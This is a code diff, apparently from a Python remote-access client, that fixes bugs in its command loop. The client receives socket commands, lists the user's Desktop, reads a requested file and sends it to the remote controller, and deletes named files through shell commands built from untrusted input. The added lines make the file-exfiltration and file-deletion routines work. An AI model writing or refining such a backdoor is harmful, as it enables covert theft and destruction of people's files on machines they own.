@@ -76,8 +76,7 @@ while (True):
 
     elif decodedMsg == "SendFiles-Desktop":
         dir =  "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
-        command = dir + "&& dir"
-        result = subprocess.run(command , stdout=subprocess.PIPE, shell=True)
+        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
         msg = s.recv(1024)
         decodedMsg = msg.decode("utf-8")
@@ -85,21 +84,22 @@ while (True):
             s.sendall(bytes("cancelled", "utf-8"))
 
         else:
-            file = command+ decodedMsg
-            f = open("file", "rb")
+            file = dir + "\\" + decodedMsg
+            f = open(file, "rt")
             message = f.read(2048)
             while message:
+                print('Sending...')
                 s.sendall(bytes(message, "utf-8"))
                 message = f.read(2048)
-            s.sendall(bytes("done sending","utf-8"))
             f.close()
+            s.sendall(bytes("done sending","utf-8"))
+            
             #https: // stackoverflow.com / questions / 27241804 / sending - a - file - over - tcp - sockets - in -python
             #rb needed for sending binary file
 
     elif decodedMsg == "DeleteFiles-Desktop":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Desktop"
-        command = dir + "&& dir"
-        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+        result = subprocess.run("dir", cwd=dir, stdout=subprocess.PIPE, shell=True)
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
         msg = s.recv(1024)
         decodedMsg = msg.decode("utf-8")
@@ -107,9 +107,9 @@ while (True):
             s.sendall(bytes("cancelled", "utf-8"))
 
         else:
-            file = command + decodedMsg
+            command = "del " + decodedMsg
             #might not need shell and stdout
-            subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+            subprocess.run(command, cwd=dir, stdout=subprocess.PIPE, shell=True)
             s.sendall(bytes("File Deleted", "utf-8"))
 
 
